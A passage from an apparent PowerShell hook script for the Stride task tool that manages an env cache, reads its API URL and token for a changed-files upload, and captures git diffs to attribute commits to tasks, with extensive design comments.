    # one map per run and a hashtable cannot hold a duplicate key, so no single
    # run can emit two lines for the same key. That is why the guard belongs
    # here and not in Set-HookEnv.
    #
    # A plain line filter is correct HERE, unlike in the bash twin, because
    # Set-HookEnv already flattens newlines to spaces before writing — so a
    # cache line is always a whole record on this side, and a multi-line value
    # cannot be split across lines for the filter to corrupt. Do not copy this
    # simpler shape back into stride-hook.sh, which needs quote-state parsing.
    #
    # Scoped to the four GOAL_* keys.
    #
    # (D260) This paragraph used to end "Never move this into Set-HookEnv,
    # which is shared by all five hooks" — and D260 then put an equivalent
    # collapse there deliberately, so the prohibition is amended rather than
    # left standing against the code. What it was protecting was correct: a
    # BLANKET rewrite in a function every hook shares would have been wrong.
    # What Set-HookEnv does now is narrower — it replaces only the keys the
    # calling hook is itself writing in that call, so every other key, and
    # every other hook's keys, are still passed through untouched. That is the
    # distinction that makes the shared placement safe, and it is why the
    # duplicate-per-post-hook accumulation could be fixed once instead of
    # per-hook.
    # Routed through Write-EnvCache, not a direct Set-Content, for the same
    # reason every other rewrite on this side is: it stages to a temp file and
    # moves it into place, so a failure or a kill inside the write window
    # leaves the PREVIOUS cache intact rather than a truncated one. A direct
    # truncate-then-write here could lose TASK_BASE_REF and the per-task
    # records to a kill, which is a far worse outcome than the duplicate this
    # is cleaning up. The bash twin routes through write_env_cache for the
    # same reason.
    # (D289) This used to be a SEPARATE rewrite of its own, immediately before
    # the Set-HookEnv call below - two whole-file replaces back to back, each
    # reading the cache afresh. Guarding them independently would have made
    # things worse rather than better: a collision on the first would abandon
    # the GOAL_* drop while the second still committed, and a collision on the
    # second would abandon the export while the drop had already landed. So the
    # two are now ONE write under ONE compare-and-swap, with this function's
    # drop expressed as an argument to the write that was already happening.
    #
    # The D257 guarantee this local guard exists to hold is unchanged, and so
    # is the reason it is stated HERE rather than left to Set-HookEnv's own
    # collapse: the pattern is named at this site, so a later refactor that
    # narrowed the shared function would still have to come past this line.
    #
    # (D289) This depends on $envMap being non-empty: Set-HookEnv early-returns
    # on an empty map and would then apply no drop at all. Safe here because the
    # defaults loop above puts all four GOAL_* keys in unconditionally, so the
    # count is never below four - stated because it is a real coupling and the
    # early return is three hundred lines away.
    Set-HookEnv -EnvMap $envMap -AlsoDropPattern '^(GOAL_ID|GOAL_IDENTIFIER|GOAL_TITLE|GOAL_DESCRIPTION)$'
}

# (W1453) Forward the server-supplied hook env for the routed hook. Applied
# AFTER the cache load so server-supplied keys override stale cached values;
# keys the server does not supply keep their cached values. PreToolUse (pre
# phase) has no tool_response yet, so this is post-only.
$afterGoalRouted = $false
$responsePayload = $null
if ($Phase -eq 'post') {
    $responsePayload = Get-ResponsePayload -InputJson $Input
    Set-HookEnv -EnvMap (Get-HookEnvFromPayload -Payload $responsePayload -HookEntryName $HookName)
    # (W2123) Record the loop state for a successful completion. Self-gates on
    # HookName=before_review; best-effort, never fatal to the completion.
    Write-LoopStateForCompletion -InputJson $Input -ResponsePayload $responsePayload
}

# Resolve the Stride API base URL for the changed_files upload. Primary source
# is $ProjectDir\.stride_auth.md (the same file the agent reads) — its
# `**API URL:** `<url>`` line — falling back to a literal URL in $Command.
function Resolve-StrideApiUrl {
    $auth = Join-Path $ProjectDir '.stride_auth.md'
    $url = ''
    if (Test-Path $auth) {
        $line = Get-Content -Path $auth | Where-Object { $_ -match '\*\*API URL:\*\*' } | Select-Object -First 1
        if ($line -and $line -match 'https?://[A-Za-z0-9._:/-]+') { $url = $Matches[0] }
    }
    if (-not $url -and $Command -match 'https?://[A-Za-z0-9._-]+(:[0-9]+)?') { $url = $Matches[0] }
    return $url
}

# Resolve the Stride API bearer token for the changed_files upload. Primary
# source is the production `**API Token:** `<token>`` line in
# $ProjectDir\.stride_auth.md — deliberately NOT the `**Local API Token:**`
# line (the `**API Token:**` pattern does not match `**Local API Token:**`) —
# falling back to a literal `Bearer <token>` in $Command. Never logged.
function Resolve-StrideApiToken {
    $auth = Join-Path $ProjectDir '.stride_auth.md'
    $token = ''
    if (Test-Path $auth) {
        $line = Get-Content -Path $auth | Where-Object { $_ -match '\*\*API Token:\*\*' } | Select-Object -First 1
        if ($line -and $line -match '`([^`]+)`') { $token = $Matches[1] }
    }
    if (-not $token -and $Command -match 'Bearer\s+([A-Za-z0-9._+/=-]+)') { $token = $Matches[1] }
    return $token
}

# ============================================================================
# (W2100) The changed-files CAPTURE engine — the BUILD half.
#
# Before this, stride-hook.ps1 only ever PUT a .stride-changed-files.json that
# some other process had written. On native Windows that process is nobody:
# stride-hook.sh:118 execs this script and exits, so a native-Windows run
# produced no snapshot at all, silently. These functions mirror
# stride-hook.sh's capture_changed_files and expand_own_ranges.
#
# Windows PowerShell 5.1 is the shipping host, so nothing here may use a 7-only
# construct. Two traps are load-bearing and are called out at their sites:
# ConvertTo-Json -AsArray does not exist on 5.1, and Set-Content -Encoding UTF8
# writes a BOM there.
# ============================================================================

# Run a git command whose stdout must survive byte-for-byte, via --output.
#
# Why not `@(& git ...)`: PowerShell splits native stdout into lines and drops
# the CR of every CRLF, so a CRLF diff would come back subtly wrong and its
# truncation line count with it. It also re-decodes through
# [Console]::OutputEncoding, mangling non-ASCII paths. Routing git's own
# --output to a temp file and reading the bytes avoids both.
#
# The temp is staged in the project's .stride/ directory, which inherits that
# directory's permissions and is hard-excluded from the capture by the
# ^\.stride/ rule, so it can never surface as an entry in the snapshot being
# built. It is deliberately NOT the system temp: see the body for why.
#
# Returns @{ Ok = [bool]; Text = [string] } and never throws. -AllowExit1 is for
# `git diff`'s "files differ" status, which is success for our purposes.
function Invoke-GitCapture {
    param([string[]]$GitArgs, [switch]$AllowExit1)
    # Stage in .stride/, NOT the system temp. git's --output creates the file at
    # 0666-minus-umask, so on POSIX hosts (Linux CI, WSL, contributor machines)
    # a world-readable /tmp would briefly expose every file's unified diff — the
    # accidentally-committed secret this capture is explicitly bounded against
    # included. The bash twin does not have that property: mktemp gives it 0600.
    # .stride/ inherits the project directory's permissions, is already hard-
    # excluded from the capture by the ^\.stride/ rule so it can never surface
    # as an entry, and is the same staging location Write-EnvCache uses.
    # No system-temp fallback. If .stride/ cannot be created the snapshot cannot
    # be written either — Write-ChangedFilesSnapshot targets the same project
    # directory — so falling back would relocate raw diff content into a
    # world-readable directory in exchange for nothing. Fail this one capture
    # instead; the caller degrades to '[]'.
    #
    # -PathType Container, not a bare Test-Path: a stray FILE named .stride
    # would otherwise satisfy the guard, skip the New-Item, and silently empty
    # every capture from then on.
    $stageDir = Join-Path $ProjectDir '.stride'
    try {
        if (-not (Test-Path -LiteralPath $stageDir -PathType Container)) {
            New-Item -ItemType Directory -Path $stageDir -Force -ErrorAction Stop | Out-Null
        }
    } catch {
        return @{ Ok = $false; Text = '' }
    }
    # Prefixed so a kill-orphaned temp is identifiable as ours and sweepable,
    # rather than an unexplained 8.3 name a `git add -A` gate might commit.
    # Mirrors Write-EnvCache's `env-cache.` convention.
    $tmp = Join-Path $stageDir ('capture.' + [System.IO.Path]::GetRandomFileName())
    try {
        # --output MUST be inserted right after the subcommand, never appended:
        # everything after a `--` separator is a PATHSPEC, so an appended
        # --output=<file> is silently read as a filename and the diff comes back
        # empty rather than failing.
        $full = @()
        if ($GitArgs.Count -gt 0) {
            $full = @($GitArgs[0], "--output=$tmp")
            if ($GitArgs.Count -gt 1) { $full = $full + $GitArgs[1..($GitArgs.Count - 1)] }
        } else {
            $full = @("--output=$tmp")
        }
        & git -C $ProjectDir @full 2>$null | Out-Null
        $code = $LASTEXITCODE
        $ok = ($code -eq 0) -or ($AllowExit1 -and $code -eq 1)
        if (-not $ok) { return @{ Ok = $false; Text = '' } }
        if (-not (Test-Path -LiteralPath $tmp -PathType Leaf)) { return @{ Ok = $true; Text = '' } }
        $enc = New-Object System.Text.UTF8Encoding($false)
        return @{ Ok = $true; Text = [System.IO.File]::ReadAllText($tmp, $enc) }
    } catch {
        return @{ Ok = $false; Text = '' }
    } finally {
        try { if (Test-Path -LiteralPath $tmp -PathType Leaf) { Remove-Item -LiteralPath $tmp -Force -ErrorAction SilentlyContinue } } catch { }
    }
}

# Invoke-GitCapture plus bash's trailing-newline strip.
#
# The regex matches \n ONLY, never \r?\n: bash's $( ) strips trailing newlines
# and leaves any trailing \r in place, and this must match it byte for byte.
function Get-GitDiffBody {
    param([string[]]$GitArgs, [switch]$AllowExit1)
    $r = Invoke-GitCapture -GitArgs $GitArgs -AllowExit1:$AllowExit1
    if (-not $r.Ok) { return '' }
    return ($r.Text -replace "\n+$", '')
}

# Split NUL-delimited git output. Used for every -z call, because splitting on
# whitespace or newlines mis-parses paths containing spaces or newlines, and
# git quotes such paths when -z is absent.
function Split-NulList {
    param([string]$Text)
    if (-not $Text) { return @() }
    return @($Text.Split([char]0) | Where-Object { $_ -ne '' })
}

# Neutralize a value before it reaches stderr.
#
# Several notices print values that came from the filesystem or from
# .stride-env-cache, which is loaded with no key allow-list and no value
# validation — so ESC can rewrite the agent's terminal and CR/LF can forge
# additional "stride-hook:" lines, including a forged REFUSING or success line,
# in the one output channel a refused or dropped capture has. Every such value
# goes through here rather than each site remembering.
function ConvertTo-PrintableForLog {
    param([string]$Value, [int]$MaxLength = 200)
    if ($null -eq $Value) { return '' }
    $sb = New-Object System.Text.StringBuilder
    foreach ($ch in $Value.ToCharArray()) {
        if ([int]$ch -lt 32 -or [int]$ch -eq 127) {
            [void]$sb.Append(('\x{0:X2}' -f [int]$ch))
        } else {
            [void]$sb.Append($ch)
        }
        # Bound the length too, so a multi-kilobyte forged value cannot flood
        # the log even once it is escaped.
        if ($sb.Length -ge $MaxLength) { [void]$sb.Append('...'); break }
    }
    return $sb.ToString()
}

# Defence in depth against a snapshot path escaping the repository root.
#
# git's own --name-only / ls-files output is already repo-relative with forward
# slashes and never absolute or ..-bearing, so this cannot fire on today's
# inputs. It mirrors the server's Kanban.Tasks.PathSafety, so a path that would
# be rejected at the API is dropped here with a note instead of shipped.
function Test-SafeRepoPath {
    param([string]$Path)
    if (-not $Path) { return $false }
    if ($Path.StartsWith('/') -or $Path.StartsWith('\')) { return $false }
    # Belt and braces alongside the `--` separators: a dash-leading path is what
    # git would read as an option, and `--output=` is only the most destructive
    # of several (-O orderfile, -I) it can reach. Rejecting the shape here means
    # a future call site that forgets its separator still cannot be steered.
    if ($Path.StartsWith('-')) { return $false }
    if ($Path -match '^[A-Za-z]:') { return $false }
    if ($Path.Contains('\')) { return $false }
    foreach ($seg in $Path.Split('/')) { if ($seg -eq '..') { return $false } }
    foreach ($ch in $Path.ToCharArray()) { if ([int]$ch -lt 32) { return $false } }
    return $true
}

# Parse `git diff --numstat -z` and return a hashtable of binary paths.
#
# Record grammar: an ordinary record is "added\tdeleted\tpath\0"; a rename or
# copy is "added\tdeleted\t\0" followed by "src\0dst\0". Binary is added and
# deleted both '-'.
#
# The -z form is deliberate. Plain --numstat prints a COMPACTED path for a
# rename ("a/{ => b}/f.md") that matches no path --name-only ever emits, so the
# bash twin's scan can never match a renamed file and a renamed BINARY escapes
# the placeholder. Taking the rename DESTINATION here fixes that; test 21aa
# pins the divergence.
function Get-NumstatBinarySet {
    param([string]$NumstatZ)
    $set = @{}
    if (-not $NumstatZ) { return $set }
    $fields = @($NumstatZ.Split([char]0))
    $i = 0
    while ($i -lt $fields.Count) {
        $rec = $fields[$i]
        if (-not $rec) { $i++; continue }
        $parts = $rec.Split([char]9)
        if ($parts.Count -lt 3) { $i++; continue }
        $added = $parts[0]
        $deleted = $parts[1]
        $path = $parts[2]
        if ($path -eq '') {
            # Rename/copy: the next two fields are src then dst.
            if (($i + 2) -lt $fields.Count) { $path = $fields[$i + 2] }
            $i += 3
        } else {
            $i++
        }
        if ($path -and $added -eq '-' -and $deleted -eq '-') { $set[$path] = $true }
    }
    return $set
}

# Expand an own-ranges list into a concatenated patch.
#
# Mirrors stride-hook.sh's expand_own_ranges. Each non-empty line is
# "<from> <to>"; the sentinel line is skipped. The pathspec MUST stay a
# separate trailing argument rather than being folded into $GitArgs — placed
# before the endpoints it silently yields an empty patch, which is the
# documented reason the bash helper exists as its own function.
# (W2102/D255) The owned set for the loop delta H0..H1: space-separated full
# SHAs in rev-list order (NEWEST FIRST), capped at 20; over the cap returns the
# OVERFLOW sentinel; identical or missing endpoints return '' (the empty
# record, which is a real answer rather than an absence). Mirror of bash's
# compute_owned_set.
#
# Newest-first is load-bearing, not incidental: Convert-OwnedSetToRange reads
# the LAST token as the oldest commit. Reverse the order and the range comes
# out backwards, git resolves it to nothing, and the resulting under-report
# looks exactly like a correct narrow one.
function Get-OwnedCommitSet {
    param([string]$H0, [string]$H1)
    if (-not $H0 -or -not $H1) { return '' }
    if ($H0 -eq $H1) { return '' }
    $shas = @()
    try {
        $shas = @(& git -C $ProjectDir rev-list "$H0..$H1" 2>$null | Where-Object { $_ })
    } catch { return '' }
    if ($LASTEXITCODE -ne 0) { return '' }
    if ($shas.Count -eq 0) { return '' }
    if ($shas.Count -gt 20) { return $script:StrideOwnedOverflow }
    return ($shas -join ' ')
}

# (W2102/D255) Convert a non-empty owned set into ONE "<oldest>^ <newest>" range
# line for Expand-OwnRanges. The set is contiguous by construction (a single
# H0..H1 delta), so one range covers it. Mirror of bash's owned_set_to_range.
#
# Returns '' — callers fall back — when the set is empty or OVERFLOW, or when
# the oldest commit's parent does not resolve (a root commit, or a rebase that
# already rewrote the SHAs away). Matching nothing over-reports, which is the
# documented safer failure.
function Convert-OwnedSetToRange {
    param([string]$Set)
    if (-not $Set) { return '' }
    if ($Set -eq $script:StrideOwnedOverflow) { return '' }
    $toks = @($Set -split '\s+' | Where-Object { $_ })
    if ($toks.Count -eq 0) { return '' }
    $newest = $toks[0]
    $oldest = $toks[$toks.Count - 1]
    if (-not $oldest) { return '' }
    $null = & git -C $ProjectDir rev-parse --verify "$oldest^" 2>$null
    if ($LASTEXITCODE -ne 0) { return '' }
    return ($oldest + '^ ' + $newest)
}

# (W2102/D273) The horizon that decides when an open window is too old to keep
# vouching in Test-AnotherOpenWindowExists. Mirror of bash's
# open_window_max_age_secs.
#
# Validated digits-only AND width-bounded, and the width bound is kept even
# though PowerShell has neither of bash's failure modes (no octal reading, no
# strtoimax overflow). The two executors must fall back on the same inputs, or
# a checkout shared between hosts narrows on one and not the other. Ten digits
# is ~317 years, well past any horizon anyone means.
function Get-OpenWindowMaxAgeSecs {
    $v = [System.Environment]::GetEnvironmentVariable('STRIDE_OPEN_WINDOW_MAX_AGE_SECS', 'Process')
    if (-not $v) { return '14400' }
    if ($v -notmatch '^[0-9]+\z') { return '14400' }
    if ($v.Length -gt 10) { return '14400' }
    return $v
}

# (W2102/D271+D273) TRUE when some task OTHER than $SelfTaskId has an OPEN
# window on record — a TASK_BASE_REF_<id> line with no TASK_HEAD_REF_<id>
# partner, since the head is written only at completion. Decides whether the
# D255 owned-set narrowing is safe for the completing task's capture. Mirror of
# bash's another_open_window_exists.
#
# READ DIRECTION IS ASYMMETRIC ON PURPOSE, and must not be tidied to one
# source: bases come from the FILE (they are records), heads from the ENV (the
# ported readers are env-backed, matching bash's task_head_ref_for), and the
# claim stamp from the FILE. Bash makes the same split for the same reason, and
# a "consistent" version would answer differently from the twin.
#
# EVERY validation failure takes the wide path — answer "no open window" — so
# an unusable clock, an unresolvable base, or an unparseable stamp all degrade
# toward over-reporting rather than toward absorbing another task's commits.
function Test-AnotherOpenWindowExists {
    param([string]$SelfTaskId)
    $selfKey = ''
    if ($SelfTaskId) { $selfKey = Get-TaskBaseRefKey -TaskId $SelfTaskId }
    # No usable clock means the age check cannot run, and D271's rule is that a
    # validation failure vouches for nothing.
    # THE SAME EPOCH EXPRESSION THE WRITER USES, and that is the whole point.
    # `Get-Date -UFormat %s` computes seconds from LOCAL time on Windows
    # PowerShell 5.1 - the shipping host - while pwsh 7 returns true UTC. The
    # stamp is written from UtcNow, so the two disagreed by the host's offset:
    # west of UTC every fresh window yields a NEGATIVE age and is dropped by the
    # guard below, east of +4h every fresh window exceeds the horizon. Either
    # way this predicate answers "no open window" unconditionally and the D255
    # narrowing never engages - the gate silently inert exactly where it was
    # ported to run. A fixture deriving both sides from the same call cannot see
    # it, which is why 24d2 below compares the reader's clock to the WRITER's.
    $now = 0
    try {
        $epochStart = New-Object DateTime 1970, 1, 1, 0, 0, 0, ([DateTimeKind]::Utc)
        $now = [int64][math]::Floor(([DateTime]::UtcNow - $epochStart).TotalSeconds)
    } catch { return $false }
    if ($now -le 0) { return $false }
    $maxAge = [int64](Get-OpenWindowMaxAgeSecs)

    $lines = @()
    try {
        $r = Split-EnvCacheRecord
        if (-not $r.Ok) { return $false }
        $lines = @($r.Records)
    } catch { return $false }

    foreach ($line in $lines) {
        if ($line -notmatch '^TASK_BASE_REF_[A-Za-z0-9_]+=') { continue }
        $bkey = $line.Substring(0, $line.IndexOf('='))
        if ($selfKey -and $bkey -eq $selfKey) { continue }
        if ($bkey -match '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)\z') { continue }
        $id = $bkey.Substring('TASK_BASE_REF_'.Length)
        # A head partner means the window CLOSED. Env-backed, as bash is.
        if (Get-TaskHeadRefFor -TaskId $id) { continue }
        $b = ConvertFrom-ShSingleQuoted -Value $line.Substring($line.IndexOf('=') + 1)
        if (-not $b) { continue }
        $null = & git -C $ProjectDir rev-parse --verify --quiet "$b^{commit}" 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        $null = & git -C $ProjectDir merge-base --is-ancestor $b HEAD 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        # Resolvable and an ancestor is necessary but NOT sufficient: an
        # abandoned claim leaves exactly that shape behind permanently. Age the
        # record out by when the window was OPENED, from the stamp its own
        # claim wrote. A MISSING stamp reads DEAD, deliberately — every window
        # opened by a hook carrying this change is stamped, so an unstamped
        # record was written by an older version and is by construction from an
        # earlier session.
        $stamp = ''
        $rec = Get-TaskBaseAtRecord -TaskId $id
        if ($rec.Found) { $stamp = $rec.Value }
        if (-not $stamp) { continue }
        if ($stamp -notmatch '^[0-9]+\z') { continue }
        if ($stamp.Length -gt 10) { continue }
        $age = $now - [int64]$stamp
        # A stamp AHEAD of the clock is not a small age, it is a negative one,
        # and negative trivially passes the -gt test — so a future-stamped
        # window would vouch as live forever, which is the exact record this
        # check exists to retire. Reachable without tampering: a clock
        # corrected backwards, or a checkout shared between hosts.
        if ($age -lt 0) { continue }
        # Age exactly AT the horizon counts as LIVE (strict -gt), as bash.
        if ($age -gt $maxAge) { continue }
        return $true
    }
    return $false
}

# (W2102/D236+D244+D255+D256) The attribution engine. Given this task's own
# base, return the commit ranges that belong to THIS task — every other task's
# recorded window subtracted, but only where subtracting it is provably safe.
# Mirror of bash's attributed_commit_ranges.
#
# THREE DISTINCT RETURN VALUES, and collapsing any two is a defect:
#   ''                        no window applies; the caller keeps its ordinary
#                             single-base behaviour.
#   $script:StrideNoOwnCommits  attribution applied and this task provably made
#                             no commits of its own; the caller must emit an
#                             EMPTY snapshot. Merging this with '' is the D236
#                             outer-absorbs-its-children bug.
#   range lines               "<from>^ <to>", oldest-first, one per contiguous run.
function Get-AttributedCommitRange {
    param([string]$OwnBase, [string]$SelfTaskId)
    if (-not $OwnBase) { return '' }
    if (-not (Get-Command git -ErrorAction SilentlyContinue)) { return '' }
    $null = & git -C $ProjectDir rev-parse --verify $OwnBase 2>$null
    if ($LASTEXITCODE -ne 0) { return '' }

    $selfKey = ''
    if ($SelfTaskId) { $selfKey = Get-TaskBaseRefKey -TaskId $SelfTaskId }

    # --- Phase A: collect every OTHER task's window ------------------------
    # A window needs BOTH ends: the base says where it started, the D236 head
    # record says where it stopped. Without the end marker it cannot be
    # bounded, so it is skipped rather than guessed at.
    $windows = New-Object System.Collections.Generic.List[string]
    $superseded = New-Object System.Collections.Generic.HashSet[string]
    $ownedCovered = New-Object System.Collections.Generic.HashSet[string]
    $lines = @()
    try {
        $r = Split-EnvCacheRecord
        if ($r.Ok) { $lines = @($r.Records) }
    } catch { $lines = @() }

    foreach ($line in $lines) {
        if ($line -notmatch '^TASK_BASE_REF_[A-Za-z0-9_]+=') { continue }
        $bkey = $line.Substring(0, $line.IndexOf('='))
        if ($selfKey -and $bkey -eq $selfKey) { continue }
        if ($bkey -match '^TASK_BASE_REF_(TRUSTED|OWNER|UNPROVEN)\z') { continue }
        $id = $bkey.Substring('TASK_BASE_REF_'.Length)
        $b = ConvertFrom-ShSingleQuoted -Value $line.Substring($line.IndexOf('=') + 1)
        $h = Get-TaskHeadRefFor -TaskId $id
        if (-not $b -or -not $h) { continue }
        $null = & git -C $ProjectDir rev-parse --verify $b 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        $null = & git -C $ProjectDir rev-parse --verify $h 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        $null = & git -C $ProjectDir merge-base --is-ancestor $OwnBase $b 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        $null = & git -C $ProjectDir merge-base --is-ancestor $h HEAD 2>$null
        if ($LASTEXITCODE -ne 0) { continue }
        # (D255) A window whose task recorded a NON-EMPTY owned set names its
        # commits exactly, so the purity heuristic is superseded for it.
        # Empty, OVERFLOW and absent all fall back to D244 classification —
        # empty because with manual commits "the loop authored nothing" does
        # NOT mean "the task authored nothing", and treating '' as
        # subtract-nothing re-opens W2066 for every hand-committing agent.
        $ownedRec = Get-TaskOwnedRecord -TaskId $id
        if ($ownedRec.Found -and $ownedRec.Value -and $ownedRec.Value -ne $script:StrideOwnedOverflow) {
            $null = $superseded.Add($b + ' ' + $h)
            foreach ($oc in @($ownedRec.Value -split '\s+' | Where-Object { $_ })) {
                $null = $ownedCovered.Add($oc)
            }
        }
        $windows.Add($b + ' ' + $h) | Out-Null
    }
    if ($windows.Count -eq 0) { return '' }

    # --- Phase B: expand each window once ---------------------------------
    $sets = New-Object System.Collections.Generic.List[object]
    $idx = 0
    foreach ($w in $windows) {
        # (D255) Owned windows contribute their exact SHAs and skip
        # classification entirely.
        if ($superseded.Contains($w)) { continue }
        $sp = $w.IndexOf(' ')
        $wb = $w.Substring(0, $sp)
        $wh = $w.Substring($sp + 1)
        # `<base>..<head>` is base-EXCLUSIVE and that is load-bearing: a nested
        # task's base is normally the outer task's own last commit, so
        # including it attributes the outer's work to its child. Do not "fix".
        $setLines = @()
        try { $setLines = @(& git -C $ProjectDir rev-list "$wb..$wh" 2>$null | Where-Object { $_ }) } catch { $setLines = @() }
        if ($setLines.Count -eq 0) { continue }
        $idx++
        $hs = New-Object System.Collections.Generic.HashSet[string]
        foreach ($s in $setLines) { $null = $hs.Add($s) }
        # Size and Index MUST be [int]. Sort-Object compares strings otherwise,
        # and "10" sorts before "9".
        $sets.Add([pscustomobject]@{ Size = [int]$setLines.Count; Index = [int]$idx; Lines = $setLines; Set = $hs })
    }

    # --- Phase C: the D256 purity fixpoint --------------------------------
    # Classify smallest-set-first. A window's residual is reduced ONLY by
    # (a) commits in a D255 owned record and (b) the sets of windows ALREADY
    # classified PURE that NEST INSIDE this one — subset, never mere
    # intersection. D244 computed each residual against every other window's
    # full span, which let two CONCURRENTLY open windows mutually "cover" the
    # commits they merely shared: both read PURE and the union subtracted the
    # outer's own commit, losing its author's work. Mutual coverage is
    # evidence of AMBIGUITY, not purity — a commit has one owner.
    $coveredSet = New-Object System.Collections.Generic.HashSet[string]
    $pool = New-Object System.Collections.Generic.List[object]
    try {
        foreach ($e in @($sets | Sort-Object @{Expression = { $_.Size }}, @{Expression = { $_.Index }})) {
            $cov = New-Object System.Collections.Generic.HashSet[string]
            foreach ($s in $e.Lines) { if ($ownedCovered.Contains($s)) { $null = $cov.Add($s) } }
            foreach ($p in $pool) {
                # Pool set SUBSET-OF this set. Reversing the operands tests
                # the opposite relation and is silent: 24e's nested case is the
                # one that catches it, because the sibling geometry gives the
                # same answer either way.
                #
                # The Count guard is UNREACHABLE as written, and kept anyway.
                # Phase B skips any window whose rev-list is empty, so no set
                # in the pool can be empty and no test can reach this branch -
                # mutation-checked: removing the guard changes nothing today.
                # It is kept because IsSubsetOf on an empty set returns TRUE,
                # so if Phase B's filter is ever relaxed, an empty pool set
                # would cover every window, every residual would collapse to 0,
                # everything would read PURE and D244 would reopen. The two
                # belong together: relax that filter and this guard is what
                # stops it becoming a defect. bash carries the same pair for
                # the same reason.
                if ($p.Set.Count -gt 0 -and $p.Set.IsSubsetOf($e.Set)) {
                    foreach ($s in $p.Lines) { $null = $cov.Add($s) }
                }
            }
            $residual = 0
            if ($cov.Count -gt 0) {
                $residual = @($e.Lines | Where-Object { -not $cov.Contains($_) }).Count
            } else {
                $residual = $e.Lines.Count
            }
            # Residual <= 1: PURE (the one residual is that task's own
            # auto-commit) and its full span joins the covered set. Residual
            # >= 2: AMBIGUOUS — an outer commit landed mid-window — so it
            # contributes NOTHING and falls through to the caller.
            if ($residual -le 1) {
                foreach ($s in $e.Lines) { $null = $coveredSet.Add($s) }
                $pool.Add($e) | Out-Null
            }
        }
    } catch {
        # Every failure in this fixpoint must degrade toward AMBIGUOUS
        # (over-report). Leaving only the owned SHAs covered is the PowerShell
        # re-expression of bash's "mktemp failed, so every fallback window is
        # ambiguous". A zero-residual default is the one branch that would fail
        # toward subtracting a span, i.e. toward lost work.
        $coveredSet = New-Object System.Collections.Generic.HashSet[string]
    }
    foreach ($s in $ownedCovered) { $null = $coveredSet.Add($s) }

    # --- Phase D: walk oldest-first, grouping survivors into runs ---------
    # --reverse here, unlike Phase B's plain rev-list, so runs group correctly.
    $walk = @()
    try { $walk = @(& git -C $ProjectDir rev-list --reverse "$OwnBase..HEAD" 2>$null | Where-Object { $_ }) } catch { $walk = @() }
    $out = New-Object System.Collections.Generic.List[string]
    $runStart = ''
    $runPrev = ''
    foreach ($c in $walk) {
        if ($coveredSet.Contains($c)) {
            if ($runStart) {
                $out.Add($runStart + '^ ' + $runPrev) | Out-Null
                $runStart = ''
                $runPrev = ''
            }
            continue
        }
        if (-not $runStart) { $runStart = $c }
        $runPrev = $c
    }
    if ($runStart) { $out.Add($runStart + '^ ' + $runPrev) | Out-Null }

    if ($out.Count -eq 0) { return $script:StrideNoOwnCommits }
    return (($out -join "`n") + "`n")
}

function Expand-OwnRanges {
    param([string]$Ranges, [string]$Path, [string[]]$GitArgs)
    $out = New-Object System.Collections.Generic.List[string]
    if (-not $Ranges) { return '' }
    foreach ($line in $Ranges.Split("`n")) {
        $t = $line.Trim()
        if (-not $t) { continue }
        if ($t -eq $script:StrideNoOwnCommits) { continue }
        $sp = $t.IndexOf(' ')
        if ($sp -lt 0) { continue }
        $from = $t.Substring(0, $sp)
        $to = $t.Substring($t.LastIndexOf(' ') + 1)
        if (-not $from -or -not $to) { continue }
        $args2 = @($GitArgs) + @($from, $to)
        if ($Path) { $args2 = $args2 + @('--', $Path) }
        $body = Get-GitDiffBody -GitArgs $args2
        if ($body) { $out.Add($body) }
    }
    # Join with NOTHING when the caller asked git for NUL-delimited output.
    # Both capture call sites use -z, and an LF between two chunks would become
    # part of the boundary record: the first path of each later chunk turns into
    # "`npath" (dropped as unsafe) and a boundary numstat record's added field
    # into "`n-" (so a renamed or binary file loses its placeholder). Bash has no
    # equivalent because its expand_own_ranges is never called with -z.
    # Unreachable while every call site passes '' — but the PARITY NOTE tells a
    # future implementer the remaining work is call sites plus the record_task_*
    # writers, and this would be waiting for them.
    if ($GitArgs -contains '-z') { return ($out -join '') }
    return ($out -join "`n")
}

# (D142) Judge whether a base ref can be trusted to anchor the snapshot, and
# recompute it from the task branch point when it cannot. Mirror of
# stride-hook.sh's resolve_snapshot_base, including its three rules and its
# stderr notice. Rule 3 exempts a base carrying TASK_BASE_REF_TRUSTED=1,
# because a base this claim's own capture wrote IS the branch point by
# construction and origin/main may legitimately have advanced past it.
function Resolve-SnapshotBaseTrust {
    param([string]$Base)
    try {
        if (-not (Get-Command git -ErrorAction SilentlyContinue)) { return $Base }
        & git -C $ProjectDir rev-parse --verify --quiet HEAD 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) { return $Base }

        $remoteHead = ''
        $sym = (& git -C $ProjectDir symbolic-ref --quiet refs/remotes/origin/HEAD 2>$null | Out-String).Trim()
        if ($LASTEXITCODE -eq 0 -and $sym) { $remoteHead = $sym -replace '^refs/remotes/', '' }
        if (-not $remoteHead) {
            foreach ($c in @('origin/main', 'origin/master')) {
                & git -C $ProjectDir rev-parse --verify --quiet $c 2>$null | Out-Null
                if ($LASTEXITCODE -eq 0) { $remoteHead = $c; break }
            }
        }
        if (-not $remoteHead) { return $Base }

        $bp = (& git -C $ProjectDir merge-base HEAD $remoteHead 2>$null | Out-String).Trim()
        if ($LASTEXITCODE -ne 0 -or -not $bp) { return $Base }

        $reason = ''
        $baseSha = ''
        if ($Base) {
            $baseSha = (& git -C $ProjectDir rev-parse --verify --quiet "$Base^{commit}" 2>$null | Out-String).Trim()
            if ($LASTEXITCODE -ne 0) { $baseSha = '' }
        }
        if (-not $Base -or -not $baseSha) {
            $reason = 'empty or unresolvable'
        } else {
            & git -C $ProjectDir merge-base --is-ancestor $baseSha HEAD 2>$null | Out-Null
            if ($LASTEXITCODE -ne 0) {
                $reason = 'not an ancestor of HEAD'
            } else {
                $trusted = [System.Environment]::GetEnvironmentVariable('TASK_BASE_REF_TRUSTED', 'Process')
                if ($trusted) { $trusted = $trusted.Trim("'") }
                if ($trusted -ne '1' -and $baseSha -ne $bp) {
                    & git -C $ProjectDir merge-base --is-ancestor $baseSha $bp 2>$null | Out-Null
                    if ($LASTEXITCODE -eq 0) {
                        $reason = 'older than the task branch point, so the diff would span commits pulled from origin'
                    }
                }
            }
        }
        if (-not $reason) { return $Base }

        $shown = ConvertTo-PrintableForLog -Value $Base
        if (-not $shown) { $shown = '<empty>' }
